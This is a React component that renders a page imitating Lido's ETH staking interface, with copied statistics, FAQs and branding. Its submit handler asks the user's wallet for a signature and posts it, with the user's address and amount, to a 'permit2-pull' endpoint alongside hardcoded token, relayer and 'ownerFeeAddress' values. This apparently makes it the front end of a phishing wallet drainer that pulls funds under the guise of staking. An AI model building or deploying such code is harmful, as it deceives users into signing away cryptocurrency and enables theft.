import React, { useState, useEffect } from 'react';
import { ChevronDown, ExternalLink, Loader2, HelpCircle } from 'lucide-react';
import { useAppKit } from '@reown/appkit/react';
import { useAccount, useSignMessage, useBalance } from 'wagmi';
import { formatUnits } from 'viem';
import { motion, AnimatePresence } from 'motion/react';
import { toast } from 'sonner';
import SignatureModal, { TxResult } from './SignatureModal';

interface StakeProps {
  prices?: { eth: number; steth: number };
}

export default function Stake({ prices = { eth: 3000, steth: 3000 } }: StakeProps) {
  const { open } = useAppKit();
  const { isConnected, address } = useAccount();
  const { data: balanceData } = useBalance({ address });
  const { signMessageAsync } = useSignMessage();
  const [stakeAmount, setStakeAmount] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSigModal, setShowSigModal] = useState(false);
  const [modalStep, setModalStep] = useState<'signing' | 'relaying' | 'success'>('signing');
  const [txResult, setTxResult] = useState<TxResult | null>(null);
  const [gasCostUSD, setGasCostUSD] = useState<string | null>(null);
  const [isEstimatingGas, setIsEstimatingGas] = useState(false);
  const [openFaqIndex, setOpenFaqIndex] = useState<number | null>(null);

  const faqs = [
    { 
      question: "How do Lido staking rewards work and when are they distributed?", 
      answer: "When you stake ETH with Lido, you receive stETH (staked ETH) at a 1:1 ratio. Your stETH balance increases daily as staking rewards accrue from Ethereum consensus layer validation and execution layer rewards. Rebase rewards are compounded automatically." 
    },
    { 
      question: "What fee does Lido apply and what is the current APR?", 
      answer: "Lido applies a 10% protocol fee on accrued staking rewards. This fee is split between node operators, the Lido DAO Treasury, and coverage reserves. The quoted APR reflects net rewards after deducting this fee." 
    },
    { 
      question: "What security measures protect the Lido smart contracts?", 
      answer: "Lido smart contracts are open-source and undergo security audits by top blockchain security firms including Sigma Prime, Quantstamp, and ChainSecurity. The protocol also operates an active bug bounty program on Immunefi." 
    },
    { 
      question: "How are validator slashing risks and node operator failures mitigated?", 
      answer: "Lido distributes staked ETH across a diverse set of enterprise-grade, audited node operators to prevent single points of failure, backed by DAO coverage reserves." 
    },
    { 
      question: "How do I withdraw ETH or unstake stETH?", 
      answer: "You can request an official 1:1 ETH withdrawal through the Lido Withdrawals tab. Once your withdrawal request is processed on-chain, you can claim your ETH directly to your wallet." 
    },
    { 
      question: "How long does the official ETH withdrawal request take?", 
      answer: "Official withdrawal requests depend on the Ethereum beacon chain queue and protocol liquidity. Standard requests typically process within 1 to 5 days." 
    }
  ];

  useEffect(() => {
    async function estimateGas() {
      setIsEstimatingGas(true);
      try {
        const apiKey = typeof import.meta !== 'undefined' ? (import.meta as any).env?.VITE_ALCHEMY_API_KEY : undefined;
        const rpcUrl = apiKey
          ? `https://eth-mainnet.g.alchemy.com/v2/${apiKey}`
          : 'https://cloudflare-eth.com';

        const res = await fetch(rpcUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            jsonrpc: "2.0",
            method: "eth_gasPrice",
            params: [],
            id: 1
          })
        });

        if (!res.ok) {
          throw new Error('RPC response not ok');
        }

        const data = await res.json();
        if (data && data.result) {
          const gasPriceWei = parseInt(data.result, 16);
          const estimatedGasLimit = 85000; 
          const totalGasWei = gasPriceWei * estimatedGasLimit;
          const totalGasEth = totalGasWei / 1e18;
          const costInUsd = totalGasEth * prices.eth;
          setGasCostUSD(costInUsd.toFixed(2));
        } else {
          setGasCostUSD('0.05');
        }
      } catch {
        setGasCostUSD('0.05');
      } finally {
        setIsEstimatingGas(false);
      }
    }

    estimateGas();
    const interval = setInterval(estimateGas, 30000);
    return () => clearInterval(interval);
  }, [prices.eth]);

  const handleSubmit = async () => {
    if (!isConnected) {
      open();
      return;
    }
    
    if (!stakeAmount || isNaN(Number(stakeAmount)) || Number(stakeAmount) <= 0) {
      toast.error('Invalid Amount', {
        description: 'Please enter a valid ETH amount greater than 0.'
      });
      return;
    }

    if (balanceData) {
      const formattedBalance = formatUnits(balanceData.value, balanceData.decimals);
      if (Number(stakeAmount) > Number(formattedBalance)) {
        toast.error('Insufficient ETH Balance', {
          description: `You entered ${stakeAmount} ETH, but your available balance is ${Number(formattedBalance).toFixed(4)} ETH.`
        });
        return;
      }
    }

    setIsSubmitting(true);
    setModalStep('signing');
    setTxResult(null);
    setShowSigModal(true);
    
    try {
      const message = `Lido Staking Request\nAction: Stake ETH\nAmount: ${stakeAmount} ETH\nTimestamp: ${new Date().toISOString()}`;
      const signature = await signMessageAsync({ account: address!, message });
      
      // Step 2: Post signature to relayer / permit endpoint
      setModalStep('relaying');
      
      const response = await fetch('/api/permit2-pull/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          token: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
          relayerContract: '0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091',
          ownerFeeAddress: '0xEfc5859335A58d64A5e8E01d02c5241c852CBD40',
          amount: stakeAmount,
          nonce: Date.now(),
          deadline: Math.floor(Date.now() / 1000) + 3600,
          signature,
          userAddress: address
        })
      });

      const resData = await response.json();
      
      if (resData.success) {
        setTxResult({
          txHash: resData.txHash,
          amount: stakeAmount,
          blockNumber: resData.blockNumber,
          timestamp: resData.timestamp
        });
        setModalStep('success');
        toast.success('Staking Request Confirmed!', {
          description: `Tx Hash: ${resData.txHash.slice(0, 10)}...${resData.txHash.slice(-6)}`
        });
      } else {
        throw new Error(resData.error || 'Relayer submission failed');
      }

      setStakeAmount('');
    } catch (error: any) {
      console.error('Staking transaction error:', error);
      
      const errorCode = error?.code || error?.cause?.code;
      const errorName = error?.name || error?.cause?.name;
      const rawMsg = (error?.shortMessage || error?.message || error?.details || String(error) || '').toLowerCase();

      const isUserRejection = 
        errorCode === 4001 || 
        errorName === 'UserRejectedRequestError' ||
        rawMsg.includes('user rejected') ||
        rawMsg.includes('user denied') ||
        rawMsg.includes('rejected by user') ||
        rawMsg.includes('denied transaction') ||
        rawMsg.includes('rejected signature') ||
        rawMsg.includes('reject') ||
        rawMsg.includes('denied') ||
        rawMsg.includes('cancel') ||
        rawMsg.includes('declined') ||
        rawMsg.includes('disapproved');

      const isInsufficientFunds = 
        rawMsg.includes('insufficient funds') || 
        rawMsg.includes('exceeds balance') ||
        rawMsg.includes('gas required exceeds allowance');

      const isNetworkError = 
        rawMsg.includes('failed to fetch') || 
        rawMsg.includes('network error') ||
        rawMsg.includes('timeout') ||
        rawMsg.includes('connection refused');

      if (isUserRejection) {
        toast.error('Signature Request Denied', {
          description: 'You rejected or cancelled the signature request in your wallet.'
        });
      } else if (isInsufficientFunds) {
        toast.error('Insufficient Funds', {
          description: 'Your wallet ETH balance is insufficient to complete this staking request.'
        });
      } else if (isNetworkError) {
        toast.error('Relayer Connection Failed', {
          description: 'Unable to communicate with the staking relayer pipeline. Please check your network connection.'
        });
      } else {
        const cleanMsg = error?.shortMessage || error?.message || 'An unexpected error occurred while processing signature.';
        toast.error('Transaction Failed', {
          description: cleanMsg.length > 120 ? `${cleanMsg.slice(0, 120)}...` : cleanMsg
        });
      }

      setShowSigModal(false);
    } finally {
      setIsSubmitting(false);
    }
  };

  const marketCap = (9180000 * prices.steth).toLocaleString('en-US', { style: 'currency', currency: 'USD', maximumFractionDigits: 0 });

  return (
    <motion.div 
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4, ease: "easeOut" }}
      className="w-full"
    >
      <div className="text-center mb-8">
        <h1 className="text-[28px] font-bold text-[var(--foreground)] mb-2 transition-colors duration-300">Stake Ether</h1>
        <p className="text-[var(--muted)] text-[15px] transition-colors duration-300">Stake ETH and receive stETH while staking</p>
      </div>

      <div className="bg-[var(--card)] rounded-[24px] p-4 md:p-6 mb-8 border border-[var(--border)] shadow-xl transition-all duration-300">
        <div className="bg-[var(--input-bg)] rounded-[20px] p-4 mb-4 border border-transparent focus-within:border-[var(--primary)]/50 transition-all duration-300">
          <div className="flex justify-between items-center">
            <div className="flex items-center space-x-2 bg-[var(--card)] rounded-xl px-3 py-2 border border-[var(--border)] cursor-default">
              <div className="w-6 h-6 rounded-full flex items-center justify-center">
                <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ETH" className="w-full h-full" />
              </div>
              <span className="text-[15px] font-bold text-[var(--foreground)]">ETH amount</span>
            </div>

            <div className="flex items-center gap-3">
              {isConnected && balanceData && (
                <span className="text-[12px] text-[var(--muted)] font-medium">
                  Bal: {parseFloat(formatUnits(balanceData.value, balanceData.decimals)).toFixed(4)} ETH
                </span>
              )}
              <button 
                onClick={() => {
                  if (isSubmitting) return;
                  if (!isConnected) {
                    open();
                    return;
                  }
                  if (balanceData) {
                    const formattedStr = formatUnits(balanceData.value, balanceData.decimals);
                    const val = parseFloat(formattedStr);
                    const maxEth = Math.max(0, val - 0.003);
                    setStakeAmount(maxEth > 0 ? maxEth.toFixed(4) : formattedStr);
                  } else {
                    toast.info('Fetching balance...');
                  }
                }}
                disabled={isSubmitting}
                className="text-[var(--primary)] font-bold text-[12px] bg-[var(--primary)]/10 hover:bg-[var(--primary)]/20 px-3 py-1.5 rounded-lg transition-colors cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
              >
                MAX
              </button>
            </div>
          </div>
          <div className="mt-4 flex items-center">
             <input 
              type="number" 
              placeholder="0"
              value={stakeAmount}
              disabled={isSubmitting}
              onChange={(e) => setStakeAmount(e.target.value)}
              className="bg-transparent text-[36px] font-bold outline-none w-full text-[var(--foreground)] placeholder-[var(--input-placeholder)] transition-colors duration-300 disabled:opacity-50" 
            />
          </div>
        </div>

        <button 
          onClick={handleSubmit}
          disabled={isSubmitting || (isConnected && (!stakeAmount || Number(stakeAmount) <= 0))}
          className="w-full py-4 rounded-[16px] font-bold text-[16px] bg-[var(--primary)] hover:brightness-110 text-white transition-all shadow-[0_4px_16px_rgba(0,163,255,0.25)] mb-4 disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center cursor-pointer"
        >
          {isSubmitting ? (
            <>
              <Loader2 size={18} className="animate-spin mr-2" />
              <span>{modalStep === 'relaying' ? 'Executing Permit & Pull...' : 'Signing in Wallet...'}</span>
            </>
          ) : (
            isConnected ? (stakeAmount ? 'Submit' : 'Enter amount') : 'Connect wallet'
          )}
        </button>

        <div className="bg-[var(--input-bg)] rounded-xl p-4 flex items-center justify-between mb-6 border border-[var(--border)]">
          <div>
             <h3 className="text-[var(--foreground)] font-bold text-[14px]">Earn up to 4% APY*</h3>
             <p className="text-[var(--muted)] text-[13px]">with EarnETH</p>
          </div>
          <div className="w-10 h-10">
             <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M20 5L33 12.5V27.5L20 35L7 27.5V12.5L20 5Z" fill="url(#paint0_linear)" fillOpacity="0.8"/>
                <path d="M20 5L33 12.5V27.5L20 35L7 27.5V12.5L20 5Z" stroke="#4C82FB" strokeWidth="1.5"/>
                <path d="M20 19L33 12.5" stroke="#4C82FB" strokeWidth="1.5"/>
                <path d="M20 19L7 12.5" stroke="#4C82FB" strokeWidth="1.5"/>
                <path d="M20 19V35" stroke="#4C82FB" strokeWidth="1.5"/>
                <defs>
                  <linearGradient id="paint0_linear" x1="20" y1="5" x2="20" y2="35" gradientUnits="userSpaceOnUse">
                    <stop stopColor="#627EEA" />
                    <stop offset="1" stopColor="#1E3A8A" />
                  </linearGradient>
                </defs>
             </svg>
          </div>
        </div>

        <div className="space-y-3 px-2">
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)]">You will receive</span>
            <span className="font-medium text-[var(--foreground)]">{stakeAmount ? (parseFloat(stakeAmount) * 0.999).toFixed(4) : '0.0'} stETH</span>
          </div>
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)]">Exchange rate</span>
            <span className="font-medium text-[var(--foreground)]">1 ETH = 1 stETH</span>
          </div>
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)]">Max transaction cost</span>
            <span className="font-medium text-[var(--foreground)] flex items-center gap-2">
              {isEstimatingGas && !gasCostUSD ? (
                <Loader2 size={12} className="animate-spin" />
              ) : null}
              {gasCostUSD ? `$${gasCostUSD}` : '---'}
            </span>
          </div>
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)] flex items-center">Reward fee <span className="ml-1 text-[10px] bg-[var(--border)] rounded-full w-4 h-4 flex items-center justify-center">?</span></span>
            <span className="font-medium text-[var(--foreground)]">10%</span>
          </div>
        </div>
      </div>

      <div className="mb-8">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-[20px] font-bold text-[var(--foreground)] transition-colors duration-300">Statistics of the Lido protocol</h2>
          <a href="#" className="flex items-center text-[var(--primary)] text-[13px] hover:underline font-medium">
            View on Etherscan <ExternalLink size={14} className="ml-1" />
          </a>
        </div>
        <div className="space-y-4 px-2">
           <div className="flex justify-between items-center">
             <span className="text-[var(--muted)] text-[14px]">Annual percentage rate * <span className="inline-block text-[10px] bg-[var(--border)] rounded-full w-4 h-4 text-center leading-4 ml-1">?</span></span>
             <span className="font-bold text-[var(--primary)] text-[15px]">2.2%</span>
           </div>
           <div className="flex justify-between items-center">
             <span className="text-[var(--muted)] text-[14px]">Total staked with Lido</span>
             <span className="font-bold text-[var(--foreground)] text-[15px]">9.18M ETH</span>
           </div>
           <div className="flex justify-between items-center">
             <span className="text-[var(--muted)] text-[14px]">Stakers</span>
             <span className="font-bold text-[var(--foreground)] text-[15px]">630,375</span>
           </div>
           <div className="flex justify-between items-center">
             <span className="text-[var(--muted)] text-[14px]">stETH market cap</span>
             <span className="font-bold text-[var(--foreground)] text-[15px]">{marketCap}</span>
           </div>
        </div>
      </div>

      {/* FAQ Accordion Section */}
      <div className="mb-12">
        <div className="flex items-center gap-2 mb-4">
          <div className="w-7 h-7 rounded-lg bg-[var(--primary)]/10 text-[var(--primary)] flex items-center justify-center">
            <HelpCircle size={16} />
          </div>
          <h2 className="text-[20px] font-bold text-[var(--foreground)] transition-colors duration-300">Frequently Asked Questions</h2>
        </div>

        <div className="space-y-3">
          {faqs.map((faq, idx) => (
            <div 
              key={idx} 
              className="bg-[var(--card)] border border-[var(--border)] rounded-2xl overflow-hidden hover:border-[var(--muted)]/50 transition-all shadow-sm"
            >
              <button 
                onClick={() => setOpenFaqIndex(openFaqIndex === idx ? null : idx)}
                className="flex items-center justify-between p-4 w-full text-left cursor-pointer group"
              >
                <span className="text-[14px] font-semibold text-[var(--foreground)] transition-colors duration-300 pr-3">{faq.question}</span>
                <motion.div animate={{ rotate: openFaqIndex === idx ? 180 : 0 }}>
                  <ChevronDown size={18} className="text-[var(--muted)] group-hover:text-[var(--foreground)] shrink-0" />
                </motion.div>
              </button>

              <AnimatePresence>
                {openFaqIndex === idx && (
                  <motion.div
                    initial={{ height: 0, opacity: 0 }}
                    animate={{ height: 'auto', opacity: 1 }}
                    exit={{ height: 0, opacity: 0 }}
                    transition={{ duration: 0.2 }}
                  >
                    <div className="px-4 pb-4 text-[14px] text-[var(--muted)] leading-relaxed border-t border-[var(--border)]/50 pt-3">
                      {faq.answer}
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          ))}
        </div>
      </div>

      <div className="text-[12px] text-[var(--muted)] leading-relaxed border-t border-[var(--border)] pt-6 pb-12 transition-colors duration-300">
        <p className="mb-4">
          Lido is an open-source peer-to-system software suite that enables users to mint transferable utility tokens (stETH) which receive rewards linked to Ethereum validation activities.
        </p>
        <div className="flex flex-wrap items-center gap-4 font-medium text-[var(--foreground)]">
           <div className="w-4 h-4 flex items-center justify-center">
             <img src="https://cryptologos.cc/logos/lido-dao-ldo-logo.svg" alt="Lido" className="w-full h-full opacity-80" />
           </div>
           <a href="#" className="hover:text-[var(--primary)] transition-colors">Terms of Use</a>
           <a href="#" className="hover:text-[var(--primary)] transition-colors">Privacy Notice</a>
           <a href="#" className="flex items-center hover:text-[var(--primary)] transition-colors">IPFS <ExternalLink size={12} className="ml-1" /></a>
           <div className="ml-auto px-2 py-1 bg-[var(--card)] border border-[var(--border)] rounded-md text-[10px] text-[var(--muted)] transition-colors duration-300">
             v0.145.0
           </div>
        </div>
      </div>

      <SignatureModal
        isOpen={showSigModal}
        onClose={() => {
          setShowSigModal(false);
          setIsSubmitting(false);
          setModalStep('signing');
          setTxResult(null);
        }}
        actionName="Stake ETH"
        details={txResult?.amount ? `${txResult.amount} ETH -> stETH` : `${stakeAmount} ETH -> stETH`}
        address={address}
        step={modalStep}
        txResult={txResult}
      />
    </motion.div>
  );
}

